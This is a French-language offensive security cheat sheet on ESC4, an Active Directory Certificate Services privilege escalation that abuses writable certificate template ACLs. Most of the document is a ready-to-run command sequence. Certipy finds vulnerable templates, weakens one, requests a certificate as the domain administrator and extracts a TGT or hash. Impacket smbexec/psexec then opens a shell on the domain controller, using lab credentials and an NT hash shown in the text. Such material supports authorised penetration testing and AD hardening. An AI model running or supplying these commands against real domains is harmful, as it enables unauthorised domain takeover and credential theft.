# ESC4

***

ESC4 est une **technique d’escalade de privilèges** dans un environnement ADCS via **la modification non autorisée d’un modèle de certificat (Certificate Template)**. Elle exploite des **droits d’accès mal configurés** permettant à un utilisateur standard de :

* Modifier les ACL du modèle de certificat.
* Délivrer des certificats abusivement à des comptes à privilèges (comme les Domain Admins).

***

### <mark style="color:red;">🧠</mark> <mark style="color:red;"></mark><mark style="color:red;">**Pré-requis (Post-Exploitation)**</mark>

Pour réaliser une attaque ESC4, l’attaquant doit disposer de :

* Un accès initial à un compte non privilégié dans le domaine.
* Des **droits spécifiques sur un modèle de certificat** :
  * `Owner`
  * `WriteOwnerPrincipals`
  * `WriteDaclPrincipals`
  * `WritePropertyPrincipals`
* Un modèle de certificat vulnérable **activé** et avec **l'enrôlement autorisé**.
* Outils :
  * `Certipy` 🥇
  * `Impacket`, `evil-winrm`, `BloodHound`, `PKINITtools`

***

### <mark style="color:red;">🔐</mark> <mark style="color:red;"></mark><mark style="color:red;">**Droits ACL Exploitables**</mark>

Voici les **droits dangereux** sur un modèle de certificat :

| Droit ACL                 | Impact                                                                              |
| ------------------------- | ----------------------------------------------------------------------------------- |
| `Owner`                   | Droit complet sur l’objet.                                                          |
| `WriteOwnerPrincipals`    | Peut changer le propriétaire du modèle.                                             |
| `WriteDaclPrincipals`     | Peut modifier la liste de contrôle d’accès (DACL).                                  |
| `WritePropertyPrincipals` | Peut modifier les propriétés du modèle, y compris les UPN et les règles d’émission. |

***

### <mark style="color:red;">🛠️</mark> <mark style="color:red;"></mark><mark style="color:red;">**Détection de modèles vulnérables**</mark>

#### <mark style="color:green;">Avec Certipy :</mark>

```bash
certipy find -u <user> -p <pass> -dc-ip <IP_DC> -vulnerable -enabled -old-bloodhound
```

#### <mark style="color:green;">Extraction simple :</mark>

```bash
cat *_Certipy.txt | grep "ESC4"
```

#### <mark style="color:green;">Avec BloodHound :</mark>

Importation des fichiers générés par `Certipy` (JSON/ZIP) dans BloodHound.

***

### <mark style="color:red;">🚨</mark> <mark style="color:red;"></mark><mark style="color:red;">**Étapes de l’attaque (Linux & Windows)**</mark>

***

#### <mark style="color:green;">🎯 1.</mark> <mark style="color:green;"></mark><mark style="color:green;">**Modifier le modèle de certificat pour l’affaiblir (via Certipy)**</mark>

```bash
certipy template -dc-ip 192.168.115.180 -u pcoulson -p 'P4ssw0rd123456@' -template ESC4 -target DC4.shield.local -save-old
```

***

#### <mark style="color:green;">🧾 2.</mark> <mark style="color:green;"></mark><mark style="color:green;">**Demander un certificat au nom de l’administrateur**</mark>

```bash
certipy req -ca SHIELD-DC4-CA -dc-ip 192.168.115.180 -u pcoulson -p 'P4ssw0rd123456@' -template ESC4 -target DC4.shield.local -upn administrator@shield.local
```

***

#### <mark style="color:green;">🔐 3.</mark> <mark style="color:green;"></mark><mark style="color:green;">**Authentifier avec le certificat .pfx et extraire le TGT**</mark>

```bash
certipy auth -pfx administrator.pfx
```

***

### <mark style="color:blue;">🔓</mark> <mark style="color:blue;"></mark><mark style="color:blue;">**Exploitation post-authentification**</mark>

#### <mark style="color:green;">➕ Pass-The-Hash :</mark>

```bash
impacket-smbexec administrator@dc4.shield.local -hashes aad3b435b51404eeaad3b435b51404ee:c5153b43885058f27715b476e5246a50
```

#### <mark style="color:green;">➕ TGT avec impacket :</mark>

```bash
export KRB5CCNAME=administrator.ccache
impacket-psexec administrator@dc4.shield.local -k -no-pass
```

#### <mark style="color:green;">➕ Avec PKINITtools :</mark>

```bash
python gettgtpkinit.py shield.local/administrator -cert-pfx administrator.pfx PKINIT-Administrator.ccache
export KRB5CCNAME=PKINIT-Administrator.ccache
impacket-psexec administrator@dc4.shield.local -k -no-pass
```

***

### <mark style="color:red;">🔁</mark> <mark style="color:red;"></mark><mark style="color:red;">**Restaurer la configuration initiale du modèle**</mark>

```bash
certipy template -dc-ip 192.168.115.180 -u pcoulson -p 'P4ssw0rd123456@' -template ESC4 -target DC4.shield.local -configuration ESC4.json
```

***

### <mark style="color:red;">📌</mark> <mark style="color:red;"></mark><mark style="color:red;">**Résumé schématique**</mark>

```
[ User "pcoulson" ]
        ↓
[ Droits ACL sur ESC4 ]
        ↓
[ Modification du template (ESC1-like) ]
        ↓
[ Requête Certificat Admin ]
        ↓
[ .pfx → auth avec Certipy ]
        ↓
[ TGT ou hash Admin ]
        ↓
[ psexec / smbexec → DC ]
```

***
